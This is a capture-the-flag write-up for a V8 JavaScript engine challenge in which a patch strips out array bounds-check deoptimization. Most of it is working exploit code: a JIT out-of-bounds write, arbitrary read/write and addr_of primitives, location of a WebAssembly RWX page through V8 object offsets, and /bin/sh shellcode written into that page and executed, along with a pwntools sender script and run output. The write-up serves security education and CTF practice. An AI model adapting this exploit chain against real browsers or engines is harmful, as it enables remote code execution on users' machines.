# Baby's First JavaScript Engine Exploitation writeup
**Points: 500**

**Author: PewZ**

**Difficulty: crazy**

**Category: pwn**

---

patch: b/src/compiler/effect-control-linearizer.cc: LowerCheckedUint32Bounds

```
diff --git a/src/compiler/effect-control-linearizer.cc b/src/compiler/effect-control-linearizer.cc
index 97f78418d0..d3133abbe7 100644
--- a/src/compiler/effect-control-linearizer.cc
+++ b/src/compiler/effect-control-linearizer.cc
@@ -1426,12 +1426,6 @@ Node* EffectControlLinearizer::LowerTruncateTaggedToFloat64(Node* node) {
 
 Node* EffectControlLinearizer::LowerCheckBounds(Node* node, Node* frame_state) {
   Node* index = node->InputAt(0);
-  Node* limit = node->InputAt(1);
-  const CheckParameters& params = CheckParametersOf(node->op());
-
-  Node* check = __ Uint32LessThan(index, limit);
-  __ DeoptimizeIfNot(DeoptimizeReason::kOutOfBounds, params.feedback(), check,
-                     frame_state, IsSafetyCheck::kCriticalSafetyCheck);
   return index;
 }
```


We can see from the patch the deoptimization for bounds-checking is completely
removed!

This task looks a lot like a simpler version of the Krautflare challenge from
35C3, except that this one is a lot simpler. You still need some basic v8
knowledge to solve it though. A lot of the solution code is taken from
[this](https://www.jaybosamiya.com/blog/2019/01/02/krautflare/) great writeup
of the Krautflare challenge.


From the patch, we can see that no deoptimization is done in the function
`EffectControlLinearizer::LowerCheckBounds`. If this deoptimization isn't
performed, it will be possible to get an array out-of-bounds access! If we
optimize access to an array, and then try to access it out-of-bounds, V8 will
deoptimize the function. Which is a good thing, since it prevents accessing
memory outside an array. With the "mad performance" patch, however, we can
access an array out of bounds, as long as the code accessing the array has been
optimized!

We will use a target function that is very similar to the one in the blog post
mentioned above. First, we will make sure that v8 optimizes the function by
running it in a loop a bunch of times with the same argument, 0. Then, we will
run the function with 1 as an argument. At this point, the function should have
been deoptimized, but instead we access memory out of bounds :)

See the following heavily commented code for the implemention:
```js
const NUM_LOOPS_FOR_OPTIM = 100000; // Change this if it is not optimizing

// conversion between floats, integers, and SMIs
// stolen from here: https://www.jaybosamiya.com/blog/2019/01/02/krautflare/
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
	return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
	int_view[0] = this;
	return float_view[0];
}
BigInt.prototype.smi2f = function() {
	int_view[0] = this << 32n;
	return float_view[0];
}
Number.prototype.f2i = function() {
	float_view[0] = this;
	return int_view[0];
}
Number.prototype.f2smi = function() {
	float_view[0] = this;
	return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
	return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
	return BigInt(this).smi2f();
}

// function that accesses an array based on parameter
// we will first make v8 optimize the function, then access it with
// an invalid index. Since the deoptimization code has been removed, this
// will lead to an OOB access.
//
// c will contain unpacked values and will be used for the addrof primitive
// d will contain packed values and will be used for arbitrary read/write
function foobar(idx) {
	let a = [0.1, 0.1, 0.1, 0.1, 0.1, 0.1];
	let b = [1.1, 1.2, 1.3, 1.4, 1.5];
	let c = [{}, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8];
	let d = [3.1, 3.2, 3.3, 3.4];

	a[idx * 16] = (1024*1024).smi2f();

	oob_buffer = b;
	oob_buffer_unpacked = c;
	oob_buffer_packed = d;
}

// optimize function
for (var i = 0; i < NUM_LOOPS_FOR_OPTIM ; i++) {
	foobar(0);
}

// trigger function with oob value :))
// deoptimization isn't triggered, thus we end up setting a[16] to (1024 * 1024)
// this offset happens to be oob_buffer's length field
foobar(1);

console.log("[+] oob_buffer.length: " + oob_buffer.length);
if (oob_buffer.length != (1024 * 1024)) {
	throw "[-] failed to corrupt ArrayBuffer lenght";
}
```

And let's create a tiny python script that can send our JavaScript to the
server.

```python
from pwn import *
import sys

r = remote("js.tghack.no", 9001)

r.recvline()

js_code = open(sys.argv[1], "r").read()
r.sendline(js_code + "\n" + "EOF")

r.interactive()
```


```
$ python2 solve.py poc.js
[+] Opening connection to js.tghack.no on port 9001: Done
[*] Switching to interactive mode
const NUM_LOOPS_FOR_OPTIM = 100000; // Change this if it is not optimizing

// conversion between floats, integers, and SMIs
// stolen from here: https://www.jaybosamiya.com/blog/2019/01/02/krautflare/
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

// function that accesses an array based on parameter
// we will first make v8 optimize the function, then access it with
// an invalid index. Since the deoptimization code has been removed, this
// will lead to an OOB access.
//
// c will contain unpacked values and will be used for the addrof primitive
// d will contain packed values and will be used for arbitrary read/write
function foobar(idx) {
    let a = [0.1, 0.1, 0.1, 0.1, 0.1, 0.1];
    let b = [1.1, 1.2, 1.3, 1.4, 1.5];
    let c = [{}, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8];
    let d = [3.1, 3.2, 3.3, 3.4];

    a[idx * 16] = (1024*1024).smi2f();

    oob_buffer = b;
    oob_buffer_unpacked = c;
    oob_buffer_packed = d;
}

// optimize function
for (var i = 0; i < NUM_LOOPS_FOR_OPTIM ; i++) {
    foobar(0);
}

// trigger function with oob value :))
// deoptimization isn't triggered, thus we end up setting a[16] to (1024 * 1024)
// this offset happens to be oob_buffer's length field
foobar(1);

console.log("[+] oob_buffer.length: " + oob_buffer.length);
if (oob_buffer.length != (1024 * 1024)) {
    throw "[-] failed to corrupt ArrayBuffer lenght";
}

EOF
filename: /tmp/foobar.js
[+] oob_buffer.length: 1048576
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to localhost port 4444
➜  babys_first_js git:(pwn-js) ✗ python2
Python 2.7.15rc1 (default, Nov 12 2018, 14:31:15) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 1024*1024
1048576
>>> 
```

Great, the length of `oob_buffer` has been overwritten! The next steps are to
set up a few primitives:
* arbitrary read
* arbitrary write
* addr of: get the address of a JavaScript object

With these primitives, it's possible to gain code execution. All of these
primitives are implemented just like in the Krautflare blog post. Following is
the new code we need to add to our script to set up these primitives:

```js
// offset from oob_buffer to oob_buffer_packed
const RW_OFFSET = 38;
// offset from oob_buffer to oob_buffer_unpacked
const ADDR_OFFSET = 18;
const BACKING_POINTER_OFFSET = 15n;
// used to sanity-check arbitrary rw
const leaked_addr_backing = oob_buffer[RW_OFFSET].f2i() + BACKING_POINTER_OFFSET;

// Expects addr as bigint
function arb_read(addr) {
	let old = oob_buffer[RW_OFFSET];
	oob_buffer[RW_OFFSET] = (addr - BACKING_POINTER_OFFSET).i2f();
	r = oob_buffer_packed[0].f2i();
	oob_buffer[RW_OFFSET] = old;
	return r;
}

if (arb_read(leaked_addr_backing + 16n).i2f() != 3.3) {
	console.log(arb_read(leaked_addr_backing + 16n).i2f());
	throw "[-] arb_read failed sanity check";
}
console.log("[+] defined arb_read");

/* Expects addr and val as bigint */
function arb_write(addr, val) {
	let old = oob_buffer[RW_OFFSET];
	oob_buffer[RW_OFFSET] = (addr - BACKING_POINTER_OFFSET).i2f();
	oob_buffer_packed[0] = val.i2f();
	oob_buffer[RW_OFFSET] = old;
}

arb_write(leaked_addr_backing + 8n, (13.37).f2i());
if (oob_buffer_packed[1] != 13.37) {
	throw "[-] arb_write failed sanity check";
}
console.log("[+] defined arb_write");

// Expects an object as argument
// returns the address of the object
function addr_of(o) {
	let old = oob_buffer_unpacked[0];
	oob_buffer_unpacked[0] = o;
	let r = oob_buffer[ADDR_OFFSET].f2i();
	oob_buffer_unpacked[0] = old;
	return r;
}

(function (){
 let t1 = {};
 let t2 = {};
 let a1 = addr_of(t1) & (~0xffffn);
 let a2 = addr_of(t2) & (~0xffffn);
 let a3 = leaked_addr_backing & (~0xffffn);
 if (a1 != a2 || a1 != a3) {
 throw "[FAIL] addr_of failed sanity check"
 }
 })();
console.log("[+] defined addr_of");
```

Okay, nice. The final step is gaining code execution somehow. On previous
versions of V8, this was a little easier since all JIT regions were marked as
rwx. However, they are now rw when writing code to them, and rx when they can be
used by JITed code. Thankfully, there is another way to get an rwx section:
web assembly :)

We start by defining an array of wasm code. The code wa scompiled using the fac
example from
[wabt](https://github.com/WebAssembly/wabt/tree/master/wasm2c/examples/fac).
Next, we create a new WebAssembly instance using the code. Then, we find the
newly created rwx section following a few pointers from the exported WebAssembly
function.

To know what fields to read, we need to take a look at the object layout in V8.
We are looking for the SharedFunctionInfo pointer for a JSFunction. Then, we can
find the rwx section at a known offset from the SharedFunctionInfo address.

This is the object hierarchy for a JSFunction:
```
Object -> HeapObject -> JSReceiver -> JSObject -> JSFunction */
```

By reading the V8 code, we can find the different offsets needed.
To see the layout of a JSFunction, for example, we start by looking at the C++
object for JSFunction (src/objects/js-objects.h:894):
```C++
class JSFunction : public JSObject {
	// ...
// Layout description.
#define JS_FUNCTION_FIELDS(V)                              \
  /* Pointer fields. */                                    \
  V(kSharedFunctionInfoOffset, kPointerSize)               \
  V(kContextOffset, kPointerSize)                          \
  V(kFeedbackCellOffset, kPointerSize)                     \
  V(kEndOfStrongFieldsOffset, 0)                           \
  V(kCodeOffset, kPointerSize)                             \
  /* Size of JSFunction object without prototype field. */ \
  V(kSizeWithoutPrototype, 0)                              \
  V(kPrototypeOrInitialMapOffset, kPointerSize)            \
  /* Size of JSFunction object with prototype field. */    \
  V(kSizeWithPrototype, 0)

  DEFINE_FIELD_OFFSET_CONSTANTS(JSObject::kHeaderSize, JS_FUNCTION_FIELDS)
#undef JS_FUNCTION_FIELDS
}
```
If you look at all the other objects that `JSFunction` inherits from, you will
end up with the following table of field offsets:

|offset|name|object|
|:-----|:--:|:----:|
|0x0|kMapOffset|HeapObject|
|0x8|kPropertiesOrHashOffset|JSReceiver|
|0x10|kElementsOffset|JSObject|
|0x18|kSharedFunctionInfoOffset|JSFunction|

After we have found the rwx section, we can write shellcode to that location.
Then, all we have to do is to call our WebAssembly function, and the shellcode
will be triggered.

Following is the new JavaScript code adding the final step of the exploit:
```js
console.log("[+] wasm stuff incoming");
var wasm_code = new Uint8Array([
		// fac wasm code
		0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 0x60,
		0x01, 0x7f, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01, 0x03,
		0x66, 0x61, 0x63, 0x00, 0x00, 0x0a, 0x19, 0x01, 0x17, 0x00, 0x20, 0x00,
		0x41, 0x00, 0x46, 0x04, 0x7f, 0x41, 0x01, 0x05, 0x20, 0x00, 0x20, 0x00,
		0x41, 0x01, 0x6b, 0x10, 0x00, 0x6c, 0x0b, 0x0b
]);

let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports.fac;
//%DebugPrint(wasm_mod.exports);
// we can see that f is a JSFunction
//%DebugPrint(f);
let f_addr = addr_of(f);
console.log("[+] f_addr: " + f_addr.hex());

// Object -> HeapObject -> JSReceiver -> JSObject -> JSFunction
// first field in a heap object is a map
// 0x0		kMapOffset	(HeapObject)
// 0x8		kPropertiesOrHashOffset (JSReceiver)
// 0x10		kElementsOffset (JSObject)
// 0x18		kSharedFunctionInfoOffset
let kFunctionDataOffset = 0n;
let kSharedFunctionInfoOffset = 0x18n;

let shared_info = arb_read(f_addr - 1n + kSharedFunctionInfoOffset) - 1n;
console.log("[+] shared info: " + shared_info.hex());
// the 0x60 offset was found by trial and error using gdb
let rwx = arb_read(shared_info - 0x60n);
console.log("[+] rwx address: " + rwx.hex());

if ((rwx & 0xfffn) != 0) {
	throw "[-] address is not page-aligned!";
}

/* TODO: reverse shell instead? */
let shellcode = [
	0x9090909090909090n,
	0x91969dd1bb48c031n,
	0x53dbf748ff978cd0n,
	0xb05e545752995f54n,
	0xcccccccccc050f3bn
];

console.log("[+] writing shellcode");
for (var i = 0; i < shellcode.length; i++) {
	let a = rwx + (BigInt(i) * 8n);
	arb_write(a, shellcode[i]);
}
console.log("[+] done! shell incoming :))");
wasm_mod.exports.fac();
```
